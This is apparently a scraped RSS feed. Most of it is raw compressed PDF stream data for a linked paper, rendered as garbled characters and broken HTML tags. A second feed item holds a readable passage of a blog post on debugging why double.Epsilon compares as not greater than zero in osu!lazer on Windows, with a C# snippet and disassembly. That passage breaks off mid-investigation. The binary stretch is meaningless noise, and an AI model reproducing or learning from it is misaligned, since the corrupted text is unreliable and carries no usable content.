�ÇŽÕ3p[BÈË;Fy)DžhuÞ¶¾ì–MÃvL²¬ò­¼TÝ2:Ãá&amp;X�¼‰=òž�À¯Àm¾Íð@`øãŸ?Ü /k/uË¤v­—™XÙ¾éHž_jò¤—kØû	ä¥…˜´ËÚŒ¹e^Ø¾*SÜÖÕ�?Š
Ê�à5šƒïÑ"\&lt;8kµŠ4Ú—'æ3<hp€ãŽõémpÑx;·h.±Ë ÏÚ%nyw§r·6Œƒ}ùõ&kÐ°�îËm}="">òY#KsÚò¦�q³bŽ-Ì@»¥óEž›}íý[ŸÕ
sdÍÜI�ƒ»bÂÞô°F:’q‘FcÒ¨	6 ¾@ŸÚ9[÷»ôIk�‘Mc{@èàÛ:ß²d?aPg`45ÓÚ}VŽ^Ûž·…_÷Jã³Òa¤tªÇ
âiaB
š¶‘Y6l]~›ÿhv]œ™°Í�°`ëm…‘D³‘‰ƒçsï˜å±85�6E¾]ß£¤dûçÑAF,'¾)R:‹�ÙnY«a¬ÿõXd9Ü²’&amp;Ú1ž#&gt;_rŽ6U	¨èåç¸âµ&gt;ø-J &amp;
£ì'Åà
98”·wpˆ¾¸[¡¢S�ƒÓÊj3&gt;¸‹·^±ÓuÑ@¨0TÎšN¨Ç¼ÝW'&lt;0ž~ºJ6ŒÅû	n©¯‹³’Îå„èrB�÷£mžzx$*I“�¬µ,¬Ã`ËÞµf¸g?)Òêw7W¿\i�]ÜaÊÀhŒ‘?‹ÐÀ"”…U‰ó°°.T‰A½‹WÇsE9WßKdué@Ú$QÌìR§R#Æus�ÞjS�;Ö	–f +1ôé0†1GÜøm_¶Laå-´aÜmE\Œï�R&amp;ÎéCç‡,Íù¡‘£gã�&lt;Ú³M)&lt;CD/·`<w¼vn²�—æï�Ã¬5Üº$ û="">´Äw4¡˜ó-Ü­{¶œ@¥Šòø9a¢^Xë&lt;çšI°¢óŠù7ý»árçÑù”9jEÈ8�TÀ…oÕ0jO&amp;Vïx”ÉÆß|÷a­MÂÈ¡w!Dãù¥íþµlDyµbšaƒE¤ÒØ&amp;dä`™à­VEºÛLÎ7oh_:T˜m­Œb3ë_NYÙž|²&amp;5�¹‰—jN½I¤ùð˜“,2*Ö,X4’®‘ŸŠ´eÁ„ñk™.d¶ÙàZ$º»ËßÎmÐ¨Ðõ)ƒä"MÛïŽ›í¡!Ó9�ÝÃÑKŒåvþÉ±ù!ogÄÒ&nbsp;®È…Ÿ,V©ë½�âé.6L2\TïÜÄŸ6bÔ&amp;µùS3ÙR7ìÌ<f^�ÝÐwŒÞô ™©5#;z3’Äšd»eÒÅš‡Ø0ÿŸpþ7�Ø5b&Œ˜gÙoŽÙÒÜ5:8äÎÐÁÏ™dÐoÛ9Šµ;b¸ÊÔ¨Ÿb˜€Ýº±°ÿ”kŠqiŸ="÷¼h*ÆÝ��*lÀPŠ¬ó³À5ÔrÃ<˜Ä#iŸßqrÆSGN½æŠ‘—”èeéY¿Ls;Hëô07Ññ%&amp;È�Uµ=5l›ÀLi€~êÃ§ùÁn��£ø�wyÝ´+!R²­yÓø„À„É$òIÔaü0¾L“,H÷�" jjšfl|[¬]È™3þ%$õŸ)ggvd¬~²Ài~ð.Ýç0Ù‡s‹¶²n&Ìx="õ‘6ÃØÄÜþ×ìp,º)a¯3&amp;?õ·�MuË‚9J®?òXV¤{-‹÷‚b£x�I]UîV<Muª…¥’sËÅ»ŒÄ'ÛGXª9�9‡°PrWÛð–ä6Ñ[mFép<5V+!^êm`¹">@í
Q�•<eó@nz½fŽŸµuÝÒ!ß`¡"bteæ\l[ûòŽ<¸�1`÷{§oµ�„ëÌ˜êÁ×÷yq|ÁÃ—$ê‰vq”v^?tÝ«3¹àÔ��ë¯?òÚ¨>Ë¯v}Q!QÛgí#+‰{4’ë‹�H­2fRó57ËÓŸšÒdox
Ð
žn«îÖÁ ˜áL²VF]Ü‹3b}¯x(~C.­ÀÕ©Ø•_µâŽÜúºÎù€P&nbsp;SÍ§–sÍ¨üv&gt;ÚŒ½k:0i~õ(ÿåâµlÅ…GÊ
O6h2ûÂJ&lt;
”¹t6þ7ÃÀµÑ0òÛ^,	Sér—³y+yy¿bøRÀ@¼ÖJò�R±hìz;-OTŒT°
qÀÍà¿PüÆS¾ü®¤NÀÜgCh3XKÅ]M–õ(u`€©´¬m5wì]Üv&amp;ÇƒPYµìªRP¸èª£vKü|œ�(+ÏÀ.kª¼œqK¨õK™µÏÒT_0ðƒ1)$ø±þ?yÃN•º�Ü(Ã"Ù$cµÕP_î0É³ÝU@ˆ:`-\B¡Ù	@ ¦pÌ7?Çë‰TJ'bL'xL=S|‹#vvð—™ÞsåÏzjÿË)¯=ÈÒÎöÑ.Ö‡OËLÀQû(vT^Â\Î«ÎqáØ®˜
òŒôˆ’ü±}x@|‘ßó­?Ÿt�%l&lt;ä;a”Ä!çR&lt;§7;Õ"öó1×v„ñØä©…õ^âv‚âQßxqÉï¶"É’»	G²S¿‚Î&lt;êÔÒRxBÄ©á³0»Ëò’ê‹8^ž@ó�HäeK‡†tªsâ®	ø©nšmÕ½H­ðx�EÒÔm›mïñ.ã¨»¶ÈN]îÙ&lt;9VZ5Í»C¦n[ÁN,óYÛnƒ]qÅ3HîŒ,ßH¼[øÇß¤l¦)˜
I¨äA’H2±AÊ&amp;Êñ[5sÆÂQÛÍ”2€†õGU!2j&amp;Èµjù4/äHvzi¶ýàB$Ñl•?µ¢i•¯d¡¦¥ÈPVKy8Ð{Y9F…‘ŠÒtšX?-öƒtºÀÌmAãLPÌÿve9ØBxéªÂ´�û|»g�Z¨ðD¡&nbsp;j¡&nbsp;c
A:£ë¡&nbsp;¨¬¨?'¯Ñ�Šb7’×éy1YV†JÙP�±K¿ºäOIn®à@ôXk&amp;²ÓvðpùÁTöåžiðæÀÞ;l’�(œiú—¨ íýÑ×3â�&gt;0Oj°ÏÎËðW0÷L+´*ˆíØD&amp;»Š“é®ÓU8øk†� ¡°«I:‡�#£Ohbù@Op‡nÉ¾‡Ô½E&nbsp;+ôõãëJÚNH÷euºÛÏŒ9Ø0âÎ@°ó"¿¥O!Á%'ÇÁ7Ã&gt;'aŒ¼L-WÚ=ëÎ—¥ïš
¦¢f*û~4�2+fà®ö×ªƒ/±˜qÍÔõ,‰µfë:±,º)È¥¶^˜6(Ñ™aé°ÜyiÝO3
Ä‘ÔðJ�Í%e8†ÍõJú„Ñ}ž¹´ßBtß1š“:Ì�ñä¶ÅiÇ-k¤ýå
¾ÿ
¤nÙfôñ1Ô�'5ÖÉ¾²âÜpæ	è÷èæÃç^ÎÛÏ´ÞÉëÄ®Š|ËŸÆ] 
�åœüPA–bQÄÇ¸ºâë€)|Ñ’¾×·}KÞ3,à!r­xÔ¯Ð}ø¤ƒy¤zìv˜¼�³ë÷�¸}ˆŒ@RH×ƒG?Fù"ZX¹ÙWõo4kÐ˜ÃžÊKAŒ3à‡vlÄ)f½ÙËÙ9¬x�Ìé&amp;d#Äg{8$h-ÜÁówÞ�SI4¼ô8¤K�ôA›ÝèC�±Ê¹&gt;ÃjÊ¶&gt;£ÐÎøÄ$	ú®úØ$�y~¾­oØKÒ’œ4L–‹­
/žÛ€°q&lt;×½Géá’©ÕR;˜XA:¾Ó\´‰ô•&lt;é~!]HþºžtåÝS	W©JXëg‚ßåÂ¡t:0áp~‘D1Ž¾±#À§�$ƒÓ¦¡x¿Z\iw¾äÔùú9£â0�I|ÅÓCH_åxþÐC§ÜE­¿}
á0	ïN�Ö˜(|f)­ŒµcóŠ£¹ŒÁ¥ÊmÚtvÞÞ³fú÷ç�¯ã(™MPA~Òkçe“dèôûC|ÎoÿXu�ä€«Õ5ÀUŒ’ÿ^ãPv½ÆÉÁjnCÐM§uºÉ–0ÉãßQ{”(Ä
„M÷“y�¾é¾žVž’9~iúwÅà•Zó¼Á…äeVýëDå@Öñ³?¸nHv±›õE±Š.uâç|‘‹)Ëº|]ÇÙ) �Ër_j—ü|"¸aOýRIs#ÐØzóõzô3‡ùªõ»›«ÿ@ß
endstream
endobj
99 0 obj
&lt;&lt;
/Length 2881      
/Filter /FlateDecode
&gt;&gt;
stream
xÚå[ÝoÛ8Ï_aÜ“Ô¬øM-p·‹ëâv�Û^›Û—¶ŠÍÄÚÚ’kÉÉ¥ýÍ�”-ÙŒšhu8´E�Š")r8¿ùâŒC	›¥ð�†çbs��”ðÙîvÖ6ßü½øúóÅ�W/_ñtfH¦”˜]ÝÌX¦¡­gŠk¢t6»ZÎÞ%»œsÁ“eQ/v¶)&gt;_Ò$oŠªôÝyÓä‹K–%á�jžÈËW¿|açøèËWÒtˆ™ÓŒ-ØlÎ8Q”zjêâ³u;üýêâÓõ'žQF‰�b¦hJ´Á£¿û�Î–0ö®ž™Ù½›¹ÁÙ)Éd6[ÏÞ^üËó&nbsp;·-eŒa`)AReÂ®ûëMQ×îÔT2“lóKø—olcwõ9A¢ÀÁ	b@�Ô¼OÐÎÞØ�-Ö£pS!;ÿ²um;ÿ´ÏËf¿ÁN–üT9‚íüíï¯#üKSÂ8wäJC‡èeYF”É&nbsp;ý(S‹©™JÑ-nš²Ça“°¦`ü¹lÙˆàÖÝu
²9×JÑ„2ó8J#÷�ÃÔÝÿ]«DÀ
^Ü]Ó‰»àÝïAãŒ¸ï¸Ð¢3vƒv´¾"�ßZ�;¡ë=åb±ÎAˆù€«ƒ‚1€’Ihø£y&nbsp;D:”1DÀ¶S%Q½%ò\íË¥,——s!)&nbsp;EÒå\ã¨ˆÂÕ£b,\æéhIÂSù(ZRž£•¯ýØÖ)0XßTlðú%´—û|}„SÎúhšL&nbsp;©5‘@Í$h0tæ²lvûíå\¥F%Jò(Ç‘‡²KÂX(›JóTËˆMæIq–Þ0å­ÿlõpí;–ƒjšÑ!`•"R¨i€U1\ø]›ÕÎÚk›ƒËbÁ¬^ç×èŽ£#Žn—ŽÑvu2tyÓÔaÈ8€LJð¼zÈ¤!FK¿+ªbkµ­Y*ŒÒz²qtÄ!ëÒ1Z!'s…¼UÈ«K0Kùõ:O´°fY•óuu9%ì"Ê…‹�zˆÒ”ÉH…!0Ó@* 2§êézÑž”€ê°}GCÎ.
ß’}�CkÌ´®$*›Z®`žöÛ~|¸¶,D¬4Ñj(dGAØ.c�ÕSÅ@ŒÆÔÔwØàÂò çÏÁ�ù@}™$YÖ^s�!?›¼(@GBÄ.	£ý#�J;‡ÝcLãK‡Ð¢&gt;NŸ-*IÊÃ¶¥½_U[&nbsp;Z¦\¡Ex�#"ŽW—ˆÑxM¥tœuðúXºtÂ}Hñ8øðÞñ%}“zPßRžO‚`*HjzWG4ŽÀ7Ž‚8|
þÿ×Fý§®�](Ã‘2ÍÒÂøX|
(EÆ	´ý¶7»jY÷§b‰ˆÊ‘D¡ìQ0K1™&amp;šÇ-çËW°B7C*9¯ü`KÒh_]f,¸M‘ª„Jü·=" .Ôâ@ÅÛâ³Å+�Î’êÆ?�)Ï0P”aÀ.ö»¢Añà{yco}˜zœ‡çyX]€SàM¦µrÜ•´ÍŒ“¶þÜçðÎýPŠW­ÎDâ—ýçÕ›{ç�{b®^ïŠ
Ú}!’¢öÏz»Â\ónYb™÷øŸµ¥ß½'Æp&gt;ËZ&gt;†ÄÇ9‘Ü‹X˜–—ËÈRnKLµsÚ ?²ƒ3<!--ñä¾qVpð4Æ�Æ�†¦áG±8då"òºÃõð�æœSbN¸~0×‘ƒi¢dv<˜×¨¡’ÁðèlnˆÌp¼�«§�ÅŒœ¤‚  ¬Fûòç*SPt°t]ŠþG%¤üð4%A-£ò	%Ïl¢Ëvo×'–Fî‡©»ÿWXBÌM
œ9ÑÕY€YgíÅõ™¹É‘tÄëÒñíå&¨v:ÍEY¤`ÍÚ[ê3S“ãÈˆÖ%ãÛÌLòìq@9DÏ©œQˆ?	oï±½Â�Vw±‘$DÑì‘ð}'&¹6�N“&á†nž™—I@×ßMZ’+M(Ÿ&MÂ5ðˆÑç¦%G’Ç°KÂ×˜–¤`JÐ’
X6M&„Ã�W¨ø"øà"FR¬KÅ×þƒˆ˜öQ5�Âå×…Þ“à)àú™òXÍnØ5Ž£!Žf—†oÝ5W8~"§ùQçšH!ž_AIDÛ.ßC�3µO‚ SDùÜÂHâøuIø–jÙSjœú }0©<&øž\CIAË._q
Aœ×¤IaÑœNÓ¯!¦]
A€Èt’ž4©}–pÎ¡
`°
€=m!seœ‹&G¶._¡	iP�çŸ Õz
·Q¯¤à-->�•”ç¤Æ–�’«•
†Üˆ¾Ä/ŠÆBÄÆ*ÓunÐùS\fP¡GÂÝ¹&lt;#pÚÚÞÙuíÛ&gt;KlÃKã¿ZÃ6GN–`çá(¼‹/8I"´hAzŸ¦±Ì» šª)X¸À&gt;ÞÕ6'=dçÿ]Ìggïí‘îÅ,lãý¹ò¹f4(Ž“L!›O8Ù¬Pô RºÍ·Ø`ñ
†›rÆjìl“ÕÀÏm\#wñ´ûdH&nbsp;ë#e¤ƒ¾s%×
Å#œ[8áÆ³¤ýC„ú*âë/¨‹ü	Õ$¸Sù…j’QLBjßT{ŒÂ°žäb²Ú?‘]ý#=¡@†u°´O))¥ …_&gt;ÍNÖš¦”;e³`*Ô®RW
›Ad¼tcw¨Ê¬SÄÔÉÃûTºät#S4è¦“uO¿é¬šar„öñ
w�“ý%ì.\»n­lA!ÈEêBgckâ~¥ÙêzÅ[è@�ˆÏ²jüÇ^iª»b…›‚QS�ÙV­+r�&amp;Xª¨[6(ô™Ó è]PåM^.ì‘S¦�v§�<rh �œx@4Äè9þ½Õ2¢rŸÐ8_€3ü¸pk@ñëâ#¾ÚÈÒ\ahwaú9é“m´&yz�vŸma¡1ä„…ÍÊymà="Àã" 4ÉÆÚæ(="" &©š•è;eîlÐ§}±³`|ÝÊØ¾ñ³ÛÏ–="" äÅøîv`¼ãp]÷="" 21n¤ýc|™þ‡Þ­búýqÎ“?öµ:áª="" ®«#ºŽo="" b“…="CõúòLÀàã,MêUµ_/}ÛË³i9`ýKuçÎˆ«kl¶«ÜG" ÔyëÏØ°kâg·z“)_Ú�û·Ú="" òÒvûÖ|ÃfÅí*è="" †³ºÏ®¸rÌ¹øµvdbû}jz$l;«ª%hØ[£ýxágpí="" ³ðbÿ“o¶k†‚lÁgÞ1aß:_|¬}g~\Àq±î�àûêf~p\úymçm5Ïï€·vŽïø-jÖr¿ý§u’oÁ,b2†›Ê?‹¦ö‚™ñ="" ©jéÓâ7ñstr�£�}«|[ÇÈ««�­Ê="" Þ÷Åzí[a“¢="" 1zø}«{Áþí[{j†ónƒ–¡'ñmÞ*k´ìw–‡`Øƒ}ÍÛÙoó“�uvb|«ÃÿÈaœ8ˆƒˆ6ó8�b¤g�jÿÞe�ß]8s…öÊ;ßŒààºoq‚&ÿ¸y#´õa‚Êžq�gqaÃ…üð="" œÄi˜Ç®ÆÙ×<c="" +ß¹x[ßï»óåb¨¯·­¥r”a="" Ç°Ü9Þ0røx´„i´…vw$ ì�h="®¦Ô¨dY€nrÿóˆÚwy9c™ì¹N7„ŸÕõ°¹Ý-¡ŽkØ�Bˆ,íâðí½“³ã¨Jê&amp;GÉ\º#î–p«ŠÂw—]ÓqãŸÍªªmûÇº=úqôx‘À_�0®‰oÿúlgøí‡—mð²ÝôVà" æƒï¶°•zà ^øïŸaÎ?="" îáòŽæÌµøˆ„'à2Ð5¡ŸÈc—cîfäÇÜïÓ -Þi\×Â¥ÿ¿<w ="" endstream="" endobj="" 168="" 0="" obj="" <<="" length="" 3180="" filter="" flatedecode="">&gt;
stream
xÚÕÙnäÆñ]_1€44ûâa »Ž7±ØÎJN¼û@qz4ÄrH™‡v'_ŸºÈ!g©µ×AbwuuwuUu]=*Ô›þ”|‹ãU´y€Æß®^Þ]}ñÊD›4ÌâØnîö›$	´b“„q’mîv›ŸƒøzkT¢ƒ¿æué+èX|âW/}[w½/ëë·wßNë~ñJg¥ÂÌ9�«F›­vai^Ð\o•Ò.xk$.(šãcÞ–]Ssÿû&lt;UÞûú†¿ûüÚ¨à	ÿ5-ƒ¾;Ý#u�o‘€/^¥›Î¢ãqWÚ˜7}Qé:Žƒ²Þ7í1ïKÜOÇ	x&nbsp;?”·:_œ‡a�¾j®áó~DõÜØ7•”õƒª²–A^ÆÚ²ï}=n¿X"�óè4hÊB&amp;5{çx &lt;ó‘q@ÜÓ#`ÀX¡/‹%Ýï¿¹½ÃV´^Úž‡úÃµ
ré0·}7yžÔ•ÿ�–
¶pöè¥�xh—÷9cËºpœ*KìÛæÈˆ?‹D¡Â[Ôn¾F•°ÉL6Æ¨0ŽŒÑ¹”»ÐŸ¹�Ö%#ê[â*aÅKîìQ+lj‚emS´ÍPï¶š¡&nbsp;QÀ/¿½Ï;Ô,÷uÑžYÖˆÒ
÷Ç²ë&nbsp;ßÝ0F+ÐiI¾ˆswh½éó¶cŒ¼[“Ôb3¸,Úe0Ósƒ9Š­GR.âhBÕ.e�ÁÏà§²6LŒý]ü¤½†NhÂX°uô}[LÙ›ÈEmJÓòXÈëÅ´âTT~;1�e¥\ªL-ÄËÂ‚
8mbt¬]¾(ßDÊ‚^W'(ÊGØ°÷zA$ÒLläà“ó©9:x¬†NZÃ}UÛwH)éþi!H±8S¨´&amp;31Ü²,VÇPÿá±ÊK¸e5-´c”#~?GŽ&amp;S`ÑçËñ†÷ºõR *
š·!7ïÈÀ!½“�CðÙÞÊ(œ
�ÒKÁ�Íõ
Û\°°g¢œ­Ñ#QïËþÐ(PžiºJÆ%b}`n©o«“¤£ÉqhrœÂûÑwx¥aš¥3cØ[‹ÞËÖµå!ò(í6$¾~}wõË•bï8º&gt;‹Æ°(¸ÉŸßF›Œ�N„@ï	ó¸1Ö…©FÎW›Û«^Á(�&nbsp;d¥ùZœ«Ífô¦°²V›áô”‰¾»F{u_ïÁ±š�4ÍZhiiåõn4yÄS�÷uÏâ$¢t(}PYYnß&amp;#�­!t.­! Ï¬!‹Ÿl!ýîîþØ±÷GÇïä3ò)@›xïÒ6]tøùÒ±°áøçM@_&gt;y¸þ`]%ÎÓ‰j¾t2[:g~pgçÑ€Ôpª»ŒÚ¡“4EàNÞñ—Îq{ñõíVéôfÖË´ôè#X»;YÀå4.É´î¯Òà!qìß×3’ª®Y3GØœ.ÅF.‚KõNnMÄ7“yÎÁÀzÑ-lOÊ@Èg	�¢ùÃbYÅ°7ü½ÀÔõ‚^›njWŸð…|g.–ïiÏ$?ø^Ø‚á3�Â�¾õõCè¸Kêó�Ü{¦Ž.÷fM{GÛÌ‡üIZ¬Ó9Sètvæ%ÝŽl*&nbsp;Á—¯‘`¨I1|è8FÈ4¢`¶ýeÈë~82ð«F&nbsp;·ÿú‘UûÙ[öÜBàR�~×ª”±Žt3;´þ�©ÛñžJJla8üžÎÛ2#Küž‰‚žsè=3ÊáG†j7n³
¿z�h7`Gî
ÈkÐvÆž¥o�ÍÇ
Ý£k@p/žÉ%°½è¥Ýñ(\ö¹\Þöò&nbsp;“¡
‘ßç…V©W56"ºŒU°*FÅÌ	ìÏ8�hƒ°±æ.Üð/¹5Ê½?KÁ_ñMaéÒ‚•reµ™�Â�ï‡‹ë"W&lt;‹þŒÉ�¢ð&amp;
uìØõ)5ó%6
�ž\ß_ÄÏ½�
³trÄ°L¦1Œá•‰ð?2;	/N�‹œ á³¡Ü«.dÀßó'ð*x˜^\ÒtgBw.÷ÒÎ�ºˆ9Àn&gt;©<d¶Ûa‚Øúè�8gi.¢qr_�"7Þfyßñ4Ð"6kØ‘À¤¼¦og~�½™Î€ ¹…%ˆm¢¿d™Ð–s—ðá°;n¶Èá´¦il="" çÒ�«†#p¼çmß«mÊù©m(v·)¹ß="">Ñ5cHµ4"b¿‰�Ï¥,Ù¦K¢Ä¥ÁðíÜÚ#ë^‘ì"öô	ÜÚóñ8M1‘ã(gÉ†È�á?´.T e½+Ñ¡‘¾BŸr1�‚}`Ë€«~´"Ø
Xóä�k°ãoÎXÏå‡K-!±(<zhØic§+jx‰s†äu^�º�¢q`aƒ(d†vÙ3 m‰“ó½ç©nfÏ0Â¹à‹“¥x–c_«ì‚Õ„¨ÁÖ¬˜ ·Ñl—½hò¨h‹€o¢4@ü¦4iÉ iÊÃŽo×}ÉÙÌj¸="" öÍÎ¬wf‰¢²ÐÄŠ‰–%Ÿ\`aþ°5ÕúÀÆt¾$Ïq:%]o"ívìi&v2¸š\d„šôlpm+‘?„�²Ù="" ø¬”½°ÜegË­b½bŒ‚ì="" …+2Û="" ldejåex{f;w.‚9ŒŸxfsØ4e"Ü…d$üíâÚbn£c6î©Õt�eúÿx`æ×¦·ÀÌm`b§0çú,þ}s¿&0#)@…i’’µ³`õ–©Š‰Æteg�Û`»w="" f€@ÿ�2¦="" Ú�lùÇœÿw¤„]ätåcç�ãaÂŸcà6ù="" ¿fïxuÉ”g“Ëþy?m1{”p4]‘Çeb#É•qdwj£nzn4Àsc±<â1¬mØ="" kl…ÙÑl÷˜cpØé="" 6ð³ÜpoÚa¬Ð’p„ž‹s�dnqá³w="" #rý$¡qô´±ôrþtp“cg@;w‡†Ò'Ëa6‚�Ç¡ž"z_0¡õîÀgÃv�¹%"µ�•–5†+="">ZÊ­SGÉ\œTeÜBÝ&nbsp;�c.Â:¿¬(Æ Ñx¼ïN÷¾ujívX°ÓUEÆ¯,†ŠqªòáÐwùýøP³XÍ9¸ùêl\t?&gt;q0É‰‰¹qO,„0n,LÞ`RN^¥ì³ÕÆ…Y–.¥ËÓ×ˆ5¡=ÛÕ};&lt;ÆÎ¬ÑªÂHgsZÓ,B²dIƒÖY“D@Òdp³Ãc§#›ÆI²f“P¥ó3£VvÆ‘m–²!d©F[­tèÒ‹ªîª6YAkþÎ´	»`¹Á·l]›&nbsp;©…6%qº®MYò+Ú”…:šØþœ"Ès“ôEBjU”¦ÜºÔ$¬~Ì5)
Èr1f²ª4ÀIw¡c¬&lt;©[“¤ÃB²�Ó§TjÙð6gí‘’ÖŠö€÷:_&gt;ÑeqªÕšöÄ¡³ñbOm¢•=ÇzTšAš~‘§Ïm	i*Dcƒ³–+ø¢9ýPƒÑçº¦Œ•5yßËì¥-6lôM”{ÿžûË"!Èi`ƒò„ò	G4wÇ[teøâ#IÿÑc�'dàähc…%FHÖ¨Æ#èÚüÁs«TÄ÷¤9� _+ä».ö_3àj°‚
ëbZçUŸ±Oi|÷yQVXóÜJéW�¢™Í8¢»:§q)ª¦£úuÎõMÞqv¢�Q^«ò½ðË¤yK“d"øSu›G¸²‡C½àJ¾L°ãP¾d0•WÆµ)œÉ%�ÈÐ9¿@RWä•ÀÉí!¨¤£—RHzö4|¢™êï.x…�¡ÅäuL€ox„¤&lt;ê¹ÍA�V­Ïw'ît(¤�Ì[Æ„qü)eÁ7ÊX)1Üƒ©yòí»²ªþÄÝÏyW×i˜èÉÂ8ûÛÃù‹ga±ã‚þýx½ðyM²É@6®c[t";?µ`�F‘Ôñ‘~•0þîßÈqü)dÑôÔ‘KÝ‡ªðÀ ¾*N†b‹ç
Á¥gCjQçÒÙëvü‡�Ô
÷~ºåïcŽqZÇ�,Ê,˜GîpX�Pmã8qÜÁ0§{`oÆ¤ó÷Ç5­äøUÅÁm&gt;¢Ý0`zFå:?ï0þ¿¿{ýSÈÍ—#ÒxI±}�§
?ÎÏûË:ä|ùnÜx½D=‰Ôj‡OZMõDÞz»¡eÊ´&lt;82_ið›�V�\€Ïñøålëiã‹&lt;-	Ïhf¡û8´ümz¿ÖNŽ�{Ð&amp;Á#28_¿_ß]ýª*ƒš
endstream
endobj
176 0 obj
&lt;&lt;</zhøic§+jx‰s†äu^�º�¢q`aƒ(d†vù3></d¶ûa‚øúè�8gi.¢qr_�"7þfyßñ4ð"6kø‘à¤¼¦og~�½™î€></rh></eó@nz½fžÿµuýò!ß`¡"bteæ\l[ûòž<¸�1`÷{§oµ�„ëì˜êá×÷yq|áã—$ê‰vq”v^?tý«3¹àô��ë¯?òú¨></f^�ýðwœþô></w¼vn²�—æï�ã¬5üº$></hp€ãžõémpñx;·h.±ë></qvñü2›7·<></m¥·wê€¡�?@däû»0ôìpwj@™€4></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cr.yp.to/papers/categories-20200918.pdf">https://cr.yp.to/papers/categories-20200918.pdf</a></em></p>]]>
            </description>
            <link>https://cr.yp.to/papers/categories-20200918.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520781</guid>
            <pubDate>Fri, 18 Sep 2020 19:13:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When double.Epsilon can equal 0]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520728">thread link</a>) | @maple3142
<br/>
September 18, 2020 | https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html | <a href="https://web.archive.org/web/*/https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" aria-label="Content">
  <div>
    <article>
      <div>
        <p>Most of the time debugging isn’t really much to write about, especially in C# land.
In a language executing on a VM, with a managed memory model, most bugs are relatively shallow and easy to fix, except for the occasional race if you’re doing multi-threading - so when suddenly it appears that comparison of doubles has stopped working correctly, all bets are off.</p>

<p>About the only options available at that point that don’t result in loss of sanity are:</p>

<ol>
  <li>give up investigating and accept that computers are fickle, unknowable machines, uncontrollable by your puny meat-based mind,</li>
  <li>spend a week of evenings looking at why the program you’re looking at apparently entirely fails at arithmetic.</li>
</ol>

<p>From the fact that this post exists, you’ve probably guessed that I went for #2.</p>



<p>It all started with <a href="https://github.com/ppy/osu/issues/9952">yet another GitHub issue</a>, in which a user reported a crash after clicking around in the <a href="https://github.com/ppy/osu">osu!lazer</a> beatmap editor.
(I won’t go into the particular details of what a beatmap editor is, as it’s mostly unimportant to the larger topic of this post.)</p>

<p>As is usual operating procedure, I, along with others, went to try to reproduce the problem on my Ubuntu install, and failed; it looked like it was going to be yet another irreproducible, and therefore inactionable, crash report.</p>

<p>The first “hail mary” came from the reporter themselves - they managed to ascertain that the crash only happened when the game was ran in single-threaded mode, and in a joint effort we’ve also managed to ascertain that it was also Windows-specific.
This already bore the signs that it was going to be an <em>interesting</em> one to deal with - especially given where the crash was located at…</p>

<p>Without going through too much unnecessary detail, the bespoke framework that osu!lazer uses has the concept of <em>bindables</em>.
A bindable is a wrapper around a value; a bindable can be, as the name suggests, <em>bound</em> to another bindable, and therefore bidirectionally receive and send value updates to and from the other bindable.
This allows showing one particular value in multiple places on the UI, and ensuring that if one instance changes, the others will follow suit.</p>

<p>For numerical bindables, backed by floating-point values, the bindables have a built-in notion of precision, to prevent changes on the order of 1e-10 firing all sorts of callbacks when they don’t really matter.
Here’s the implementation of the <code>Precision</code> property:</p>

<div><div><pre><code><span>public</span> <span>T</span> <span>Precision</span>
<span>{</span>
    <span>get</span> <span>=&gt;</span> <span>precision</span><span>;</span>
    <span>set</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>precision</span><span>.</span><span>Equals</span><span>(</span><span>value</span><span>))</span>
            <span>return</span><span>;</span>

        <span>if</span> <span>(</span><span>value</span><span>.</span><span>CompareTo</span><span>(</span><span>default</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
            <span>throw</span> <span>new</span> <span>ArgumentOutOfRangeException</span><span>(</span><span>nameof</span><span>(</span><span>Precision</span><span>),</span> <span>value</span><span>,</span> <span>"Must be greater than 0."</span><span>);</span>

        <span>SetPrecision</span><span>(</span><span>value</span><span>,</span> <span>true</span><span>,</span> <span>this</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>For some reason, on Windows, in single-threaded mode, setting <code>Precision</code> to <code>double.Epsilon</code> caused the <code>ArgumentOutOfRangeException</code> to be thrown, even though <code>double.Epsilon</code> is <em>definitively</em> larger than zero.
Debugger or no debugger, you could <em>see</em> <code>value</code> having <code>5e-324</code> in a watch and <code>default</code> being <code>0</code>, and then the branch with the throw would be taken <em>anyway</em>, almost as if the fabric of reality was slipping from right under your feet.</p>

<p>It was clearly time to leave my beloved Rider, open up the rusty (but trusty) Visual Studio and get out the disassembly window.
After having enabled native debugging in the project settings and stepping into <code>double.CompareTo()</code>, I saw the following assembly code:</p>

<div><div><pre><code>--- /_/src/System.Private.CoreLib/shared/System/Double.cs ----------------------
            if (m_value &lt; value) return -1;
00007FFA1F5307E0  sub         rsp,18h
00007FFA1F5307E4  vzeroupper
00007FFA1F5307E7  vmovsd      xmm0,qword ptr [rcx]
00007FFA1F5307EB  vucomisd    xmm1,xmm0         ; compare xmm1 to xmm0
00007FFA1F5307EF  ja          00007FFA1F53084D  ; jump if above (CF = 0, ZF = 0)
            if (m_value &gt; value) return 1;
00007FFA1F5307F1  vucomisd    xmm0,xmm1
00007FFA1F5307F5  ja          00007FFA1F53085E
            if (m_value == value) return 0;
00007FFA1F5307F7  vucomisd    xmm0,xmm1
00007FFA1F5307FB  jp          00007FFA1F5307FF  ; jump if parity (PF = 0)
00007FFA1F5307FD  je          00007FFA1F530857  ; jump if equal (ZF = 0)
</code></pre></div></div>

<p>And, sure enough, I could definitely see that the execution of these instructions differed beteween multi-threaded and single-threaded mode.
Using the “Registers” window I dumped the register state in both cases and got the following result (click screenshot below to enlarge):</p>

<p><a href="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" target="_blank"><img src="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" alt=""></a></p>

<p><code>xmm0</code> and <code>xmm1</code> clearly have sane and expected values in both cases, so it definitely wasn’t a mis-store.
It was the comparison <em>itself</em> that was somehow wrong - but why?</p>

<p>I quickly (and, in retrospect, stupidly) went to confirm that the issue was CPU vendor-agnostic, and got the confirmation that it happens on both Intel and AMD CPUs.
